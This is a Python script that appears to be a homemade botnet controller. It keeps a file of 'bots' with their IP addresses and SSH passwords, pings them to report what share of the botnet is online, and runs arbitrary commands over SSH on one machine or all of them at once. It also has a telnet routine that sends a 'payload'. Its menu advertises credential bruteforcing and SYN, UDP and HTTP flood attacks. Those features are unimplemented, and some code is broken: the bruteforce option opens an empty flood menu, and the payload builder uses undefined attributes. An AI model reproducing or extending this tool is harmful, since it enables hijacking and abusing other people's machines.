# Import modules and libraries
# =====================================
import paramiko; import termcolor;
import colorama; import os;
import sys; import subprocess;
import socket; import time;
import re; from colorama import init;
from termcolor import colored, cprint;
colorama.init();
# =====================================


class manager():
    def __init__(self):
        self.bufferRate=0;
        self.sshBotNames=[];
        self.sshBots=[];
        self.telnetBots=[];
        self.telnetBotsPasswordless=[];
        self.sshUsernames=[];
        self.sshPasswords=[];
        self.telnetUsernames=[];
        self.telnetPasswords=[];
        self.operatingSystem="";
        
        self.sshBotNames,self.sshBots,self.sshUsernames,self.sshPasswords=self.loadBotNet('bots.txt');
        self.detectOperatingSystem();
        
    def sendCommandSSH(self,TARGET,USER,PASS,CMD):
        sshClient=paramiko.SSHClient(); sshClient.load_system_host_keys();
        sshClient.set_missing_host_key_policy(paramiko.AutoAddPolicy());
        output='';
        try:
            sshClient.connect(TARGET,port=22,username=USER,password=PASS);
            (stdin,stdout,stderr)=sshClient.exec_command(CMD);
            output=str(stdout.read()); sshClient.close();
            return True,output;
        except Exception as e:
            print(colored(f'>> ERROR : {e}','red','on_black'));
            sshClient.close(); return False,output;
        
    def detectOperatingSystem(self):
        if (os.name=="nt"):self.operatingSystem="Windows";
        elif (os.name=="posix"):self.operatingSystem="Linux";
        else:operatingSystem="Unknown";
        
    def checkHostStatus(self,ADDRESS):
        if (self.operatingSystem=="Windows"):
            result=""; fail_pattern=r"could not find"; success_pattern=r"Reply from";
            result=subprocess.run(['ping','-n','4',ADDRESS],stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True);
            time.sleep(3); output=result.stdout+result.stderr;
            if (re.search(fail_pattern,output) or re.search('Destination host unreachable',output)):return False;
            elif (re.search(success_pattern,output)):return True;
            else:return False;
        else:
            result=""; fail_pattern=r"could not find"; success_pattern=r"bytes from";
            result=subprocess.run(['ping','-c','2',ADDRESS],stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True);
            time.sleep(3); output=result.stdout+result.stderr;
            if (re.search(fail_pattern,output) or re.search('Destination host unreachable',output)):return False;
            elif (re.search(success_pattern,output)):return True;
            else:return False;
    
    def __del__(self):pass;
    
    def listBots(self):
        iteration=1;
        for x, _ in enumerate(self.sshBotNames):
            print(colored(f'[{iteration}] {self.sshBotNames[x]} ({self.sshBots[x]})','white','on_black'));
            iteration+=1;
            
    def loadBotNet(self,PATH):
        name=[]; ip=[]; user=[]; passwd=[];
        with open(PATH,"r",encoding="utf-8") as f:
            for lineno, raw in enumerate(f,start=1):
                line=raw.strip();
                if (not line or line.startswith("#")):continue;
                parts=[p.strip() for p in line.split("|")];
                dev,ipa,usern,pwd=parts; name.append(dev);
                ip.append(ipa); user.append(usern);
                passwd.append(pwd);
        return name,ip,user,passwd;
        
    def sshConnect(self,TARGET,USER,PASS):
        sshClient=paramiko.SSHClient(); sshClient.load_system_host_keys();
        sshClient.set_missing_host_key_policy(paramiko.AutoAddPolicy());
        try:
            sshClient.connect(TARGET,port=22,username=USER,password=PASS);
            sshClient.close(); return True;
        except Exception as e:
            print(colored(f'>> ERROR : {e}','red','on_black'));
            sshClient.close(); return False;
        
    def clearDisplay(self):
        time.sleep(0.5);
        if (self.operatingSystem=="Windows"):os.system("cls");
        else:os.system("clear");
        
    def checkBotNetStatus(self):
        online=float(0.00); iteration=1; offline=0;
        print(colored(f'>> SENDING I.C.M.P. ECHO REQUESTS (PING) ...','white','on_blue')); print('');
        for x, _ in enumerate(self.sshBots):
            if (self.checkHostStatus(self.sshBots[x])==True):
                print(colored(f'[{iteration}] {self.sshBotNames[x]} ({self.sshBots[x]}) | HOST IS UP','green','on_black'));
                online+=1;
            else:
                print(colored(f'[{iteration}] {self.sshBotNames[x]} ({self.sshBots[x]}) | HOST IS DOWN','red','on_black'));
                offline+=1; pass;
            iteration+=1; time.sleep(1);
        print(''); print(colored(f'>> {offline} DOWN | {online} UP | BOTNET {(online*100)/len(self.sshBots)}% ONLINE','white','on_black'));
        print(''); input(">> PRESS ENTER");
        
    def displayBanner(self):
        print(colored(f'    ·▄▄▄ ▄▄▄·  ▐ ▄  ▄▄ • ','red','on_black'));
        print(colored(f'    ▐▄▄·▐█ ▀█ •█▌▐█▐█ ▀ ▪','red','on_black'));
        print(colored(f'    ██▪ ▄█▀▀█ ▐█▐▐▌▄█ ▀█▄','red','on_black'));
        print(colored(f'    ██▌.▐█ ▪▐▌██▐█▌▐█▄▪▐█','red','on_black'));
        print(colored(f'    ▀▀▀  ▀  ▀ ▀▀ █▪·▀▀▀▀','red','on_black')); print('');
        
    def sshSendToAll(self,CMD):
        print(''); sent=0; print(colored(f'>> SENDING COMMAND [{CMD}] TO {len(self.sshBots)} BOTS','white','on_blue'));
        print('');
        for x, _ in enumerate(self.sshBots):
            print(colored(f'>> CHECKING BOT STATUS ({self.sshBots[x]}) ...','white','on_blue'));
            if (self.checkHostStatus(self.sshBots[x])==True):
                print(colored(f'>> SENDING COMMAND [{CMD}] TO {self.sshBots[x]}','white','on_blue'));
                st,rep=self.sendCommandSSH(self.sshBots[x],self.sshUsernames[x],self.sshPasswords[x],CMD);
                if (st==True):
                    sent+=1; print(colored(f'>> COMMAND SENT SUCCESSFULLY','green','on_black'));
                else:print(colored(f'>> FAILED TO SEND COMMAND','red','on_black'));
            else:
                print(colored(f'>> FAILED TO SEND COMMAND','red','on_black')); pass;
            time.sleep(1); print('');
        print(colored(f'>> DONE | COMMAND [{CMD}] SENT TO {sent} HOSTS','green','on_black'));
        print(''); input(">> PRESS ENTER");
  
    def sendCommandTelnet(self,host,port,username,password):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            print(f">> SENDING PAYLOAD : {password}");
            s.connect((host,port)); time.sleep(1.5);
            init_response=self.readResponse(s);
            #print(init_response);
            s.sendall((username+'\n').encode('utf-8'));
            time.sleep(1.5); response=self.readResponse(s);
            #print(response);
            s.sendall((password+'\n').encode('utf-8'));
            time.sleep(1.5); print(">> AWAITING REPLY"); 
            final_response=self.readResponse(s);
            print(final_response);
        
    def readResponse(self,sock,bufsize=2048):
        response=sock.recv(bufsize);
        return response.decode('utf-8',errors='ignore');
            
    def packPayload(self,command):
        print(colored(f">> ASSEMBLING PAYLOAD",'white','on_blue'));
        if (self.payloadFormat==1):return str(self.payloadAStart+command+self.payloadAEnd);
        else:return str(self.payloadAStart+command+self.payloadAEnd);
        
    def displayMenu(self):
        print(colored(f'==========================================================================','white','on_black'));
        print(colored(f'[1] Check BotNet Status','white','on_black'));           
        print(colored(f'[2] List Bots','white','on_black'));                      
        print(colored(f'[3] Add Bot','white','on_black'));                       
        print(colored(f'[4] Connect','white','on_black'));                       
        print(colored(f'[5] Send Command','white','on_black'));
        print(colored(f'[6] Send to All','white','on_black'));
        print(colored(f'[7] Bruteforce Credentials','white','on_black')); 
        print(colored(f'[8] Denial of Service Attack','white','on_black'));
        print(colored(f'[9] Ping','white','on_black'));
        print(colored(f'[10] Port Scan','white','on_black'));
        print(colored(f'[11] Enumerate Sub-domains','white','on_black')); 
        print(colored(f'[12] Enumerate Web-Directories','white','on_black')); 

        print(colored(f'[0] Exit','red','on_black'));
        print(colored(f'==========================================================================','white','on_black'));
        
    def main(self):
        while (True):
            self.clearDisplay(); self.displayBanner();
            self.displayMenu(); print('');
            selection=input(f'>> SELECT : ');
            
            if (selection=='0'):
                print(''); print(colored(f'>> EXITING PROGRAM ... ','red','on_black'));
                time.sleep(1); break;
            
            elif (selection=='3'):
                print(''); string="";
                nm=input('>> DEVICE NAME : '); tip=input('>> IPv4 ADDRESS : ');
                ur=input('>> USER : '); pawd=input('>> PASS : ');
                print(''); string="\n"+nm+"  |   "+tip+" |   "+ur+"  |   "+pawd;
                with open("bots.txt","a",encoding="utf-8") as f:f.write(string);
                print(colored(f'>> ADDED SUCCESSFULLY','green','on_black'));
                self.sshBotNames,self.sshBots,self.sshUsernames,self.sshPasswords=self.loadBotNet('bots.txt');
                print(''); input(">> PRESS ENTER");
            
            elif (selection=='6'):
                print(''); commd=input('>> COMMAND : '); self.sshSendToAll(commd);
                
            elif (selection=='7'):
                print(''); print(colored(f'[1] Ping of Death','white','on_black'));
                print(colored(f'[2] U.D.P. Flood Attack','white','on_black'));
                print(colored(f'[3] S.Y.N. Flood Attack','white','on_black'));
                print(colored(f'[4] H.T.T.P. POST Request Flood Attack','white','on_black'));
                print(colored(f'[5] H.T.T.P. GET Request Flood Attack','white','on_black'));                
                print(colored(f'[6] U.D.P. Flood Attack + Ping of Death','white','on_black'));
                print(colored(f'[7] H.T.T.P. Flood Attack + U.D.P. Flood Attack','white','on_black'));
                print(colored(f'[8] Exit','red','on_black')); print('');
                sel=input(f">> SELECT : ");
                
                if (sel=='8'):pass;
                else:pass;
                
            elif (selection=='2'):
                print(''); self.listBots();
                print(''); input(">> PRESS ENTER");
            
            elif (selection=='1'):
                print(''); self.checkBotNetStatus();
            
            elif (selection=='5'):
                print(''); iteration=1;
                for x, _ in enumerate(self.sshBotNames):
                    if (self.checkHostStatus(self.sshBots[x])==True):
                        print(colored(f'[{iteration}] {self.sshBotNames[x]} ({self.sshBots[x]}) | {self.sshUsernames[x]}  |   {self.sshPasswords[x]}','green','on_black'));
                    else:
                        print(colored(f'[{iteration}] {self.sshBotNames[x]} ({self.sshBots[x]}) | {self.sshUsernames[x]}  |   {self.sshPasswords[x]}','red','on_black'));
                    iteration+=1;
                print(''); ipaddr=input(f'>> TARGET HOST : ');
                usr=input(f'>> USER : '); pwd=input(f'>> PASS : ');
                print(''); cmd=input(f'>> COMMAND : ');
                print(colored(f'>> SENDING COMMAND ...','white','on_blue'));
                cmdState,cmdReply=self.sendCommandSSH(ipaddr,usr,pwd,cmd);
                if (cmdState==True):
                    print(colored(f'>> COMMAND SENT SUCCESSFULLY','green','on_black'));
                    print(''); print(colored(f'>> REPLY : {cmdReply}','white','on_black'));
                    print(''); input('>> PRESS ENTER');
            
            elif (selection=='4'):
                print(''); iteration=1;
                for x, _ in enumerate(self.sshBotNames):
                    if (self.checkHostStatus(self.sshBots[x])==True):
                        print(colored(f'[{iteration}] {self.sshBotNames[x]} ({self.sshBots[x]}) | {self.sshUsernames[x]}  |   {self.sshPasswords[x]}','green','on_black'));
                    else:
                        print(colored(f'[{iteration}] {self.sshBotNames[x]} ({self.sshBots[x]}) | {self.sshUsernames[x]}  |   {self.sshPasswords[x]}','red','on_black'));
                    iteration+=1;
                print(''); ipaddr=input(f'>> TARGET HOST : ');
                usr=input(f'>> USER : '); pwd=input(f'>> PASS : ');
                print(''); print(colored(f'>> CONNECTING ...','white','on_blue'));
                if (self.sshConnect(ipaddr,usr,pwd)==True):
                    print(colored(f'>> CONNECTED','green','on_black'));
                    print(colored(">> TYPE 'GOODBYE' TO QUIT",'white','on_black'));
                    print('');
                    while (True):
                        cmd=input(f'>> COMMAND : ');
                        if (cmd.upper()=="GOODBYE"):break;
                        else:pass;
                        print(colored(f'>> SENDING COMMAND ...','white','on_blue'));
                        cmdState,cmdReply=self.sendCommandSSH(ipaddr,usr,pwd,cmd);
                        if (cmdState==True):
                            print(colored(f'>> COMMAND SENT SUCCESSFULLY','green','on_black'));
                            print(''); print(colored(f'>> REPLY : {cmdReply}','white','on_black'));
                            print('');
                        else:
                            print(''); print(colored(f'>> FAILED TO SEND COMMAND','red','on_black'));
                            
                else:
                    print(colored(f'>> FAILED TO CONNECT','red','on_black')); input(">> PRESS ENTER");               
            else:pass;
            

# Instantiate and launch program
# ===============================
botnetManager=manager();
botnetManager.main();
time.sleep(1); sys.exit();
# ===============================
